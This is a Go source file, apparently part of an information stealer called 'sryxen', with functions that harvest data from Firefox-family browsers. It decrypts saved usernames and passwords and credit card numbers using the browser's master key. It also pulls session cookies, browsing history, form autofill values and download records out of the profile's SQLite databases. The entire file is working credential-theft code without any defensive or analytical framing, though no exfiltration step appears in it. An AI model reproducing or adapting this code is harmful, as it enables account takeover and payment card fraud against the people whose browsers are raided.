package target

import (
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"regexp"
	"sryxen/crypto"
	"sryxen/utils"
	_ "modernc.org/sqlite"

)

var (
	FILE_REGEX, _ = regexp.Compile("file:///(.*?),")
)

func GetGeckoPasswords(browser utils.BrowserPaths) (passwords []utils.Passwords, err error) {
	content, err := os.ReadFile(browser.LoginData)
	if err != nil {
		return
	}
	var LoginData struct {
		NextId int `json:"nextId"`
		Logins []struct {
			Hostname          string `json:"hostname"`
			EncryptedUsername string `json:"encryptedUsername"`
			EncryptedPassword string `json:"encryptedPassword"`
		} `json:"logins"`
	}
	err = json.Unmarshal(content, &LoginData)

	for _, field := range LoginData.Logins {
		var decodedUsername, decodedPassword []byte
		decodedUsername, err = base64.StdEncoding.DecodeString(field.EncryptedUsername)
		if err != nil {
			return
		}
		decodedPassword, err = base64.StdEncoding.DecodeString(field.EncryptedPassword)
		if err != nil {
			return
		}
		var decryptedUsername, decryptedPassword []byte
		decryptedUsername, err = crypto.GeckoDecrypt(decodedUsername, browser.MasterKey)
		if err != nil {
			return
		}
		decryptedPassword, err = crypto.GeckoDecrypt(decodedPassword, browser.MasterKey)
		if err != nil {
			return
		}
		password := utils.Passwords{
			Username: string(decryptedUsername),
			Password: string(decryptedPassword),
			Url:      field.Hostname,
		}
		passwords = append(passwords, password)
	}
	return
}

func GetGeckoCookies(browser utils.BrowserPaths) (cookies []utils.Cookie, err error) {
	cookieDb, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&immutable=1", browser.Cookies))
	if err != nil {
		return
	}
	defer cookieDb.Close()

	rows, err := cookieDb.Query("SELECT name, value, host, path, expiry, isSecure FROM moz_cookies")
	if err != nil {
		return
	}

	defer rows.Close()

	for rows.Next() {
		var name, value, host, path, expires, isSecure string

		err = rows.Scan(&name, &value, &host, &path, &expires, &isSecure)
		if err != nil {
			continue
		}

		if name == "" || value == "" || host == "" || path == "" || expires == "" {
			continue
		}

		cookie := utils.Cookie{
			Site:     host,
			Name:     name,
			Value:    value,
			Path:     path,
			Expires:  expires,
			IsSecure: isSecure,
		}
		cookies = append(cookies, cookie)
	}
	return
}

func GetGeckoCreditCards(browser utils.BrowserPaths) (cards []utils.CreditCard, err error) {
	_, err = os.Stat(browser.CreditCard)
	if os.IsNotExist(err) {
		return
	}
	content, err := os.ReadFile(browser.CreditCard)
	var AUTOFILL struct {
		CreditCards []struct {
			GUID            string `json:"guid"`
			Name            string `json:"cc-name"`
			Nickname        string `json:"cc-given-name"`
			ExpirationMonth int    `json:"cc-exp-month"`
			ExpirationYear  int    `json:"cc-exp-year"`
			CardNumber      string `json:"cc-number-encrypted"`
		} `json:"creditCards"`
	}
	err = json.Unmarshal(content, &AUTOFILL)
	if err != nil {
		return
	}
	for _, cc := range AUTOFILL.CreditCards {
		var decryptedNumber []byte
		decryptedNumber, _ = crypto.GeckoDecryptCreditCardNUmber(cc.CardNumber, browser.MasterKey)
		card := utils.CreditCard{
			GUID:            cc.GUID,
			Name:            cc.Name,
			ExpirationMonth: cc.ExpirationMonth,
			ExpirationYear:  cc.ExpirationYear,
			CardNumber:      string(decryptedNumber),
			Address:         "",
			Nickname:        cc.Nickname,
		}
		cards = append(cards, card)
	}

	return
}

func GetGeckoHistory(browser utils.BrowserPaths) (history []utils.History, err error) {
	historyDb, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&immutable=1", browser.History))
	if err != nil {
		return
	}
	defer historyDb.Close()

	rows, err := historyDb.Query("SELECT url, title, visit_count, last_visit_date FROM moz_places")
	if err != nil {
		return
	}

	defer rows.Close()

	for rows.Next() {
		var url, title string
		var visitCount int
		var lastTimeVisit int64
		err = rows.Scan(&url, &title, &visitCount, &lastTimeVisit)
		if err != nil {
			continue
		}

		entry := utils.History{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: lastTimeVisit,
		}
		history = append(history, entry)
	}

	return
}

func GetGeckoAutofill(browser utils.BrowserPaths) (autofill []utils.Autofill, err error) {
	autofillDb, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&immutable=1", browser.WebData))
	if err != nil {
		return
	}
	defer autofillDb.Close()

	rows, err := autofillDb.Query("SELECT fieldname, value FROM moz_formhistory")
	if err != nil {
		return
	}

	defer rows.Close()

	for rows.Next() {
		var field, value string
		err = rows.Scan(&field, &value)
		if err != nil {
			return
		}
		entry := utils.Autofill{
			Name:  field,
			Value: value,
		}
		autofill = append(autofill, entry)
	}

	return
}

func GetGeckoDownloads(browser utils.BrowserPaths) (downloads []utils.Download, err error) {
	downloadDb, err := sql.Open("sqlite", fmt.Sprintf("file:%s?mode=ro&immutable=1", browser.History))
	if err != nil {
		return
	}
	defer downloadDb.Close()

	rows, err := downloadDb.Query("SELECT place_id, GROUP_CONCAT(content), url FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id")
	if err != nil {
		return
	}

	defer rows.Close()

	for rows.Next() {
		var content, url string
		var placeId int64

		err = rows.Scan(&placeId, &content, &url)
		if err != nil {
			continue
		}

		matches := FILE_REGEX.FindStringSubmatch(content)
		if len(matches) == 0 {
			continue
		}
		download := utils.Download{
			TargetPath:    matches[1],
			Url:           url,
			ReceivedBytes: 0,
		}
		downloads = append(downloads, download)
	}

	return
}
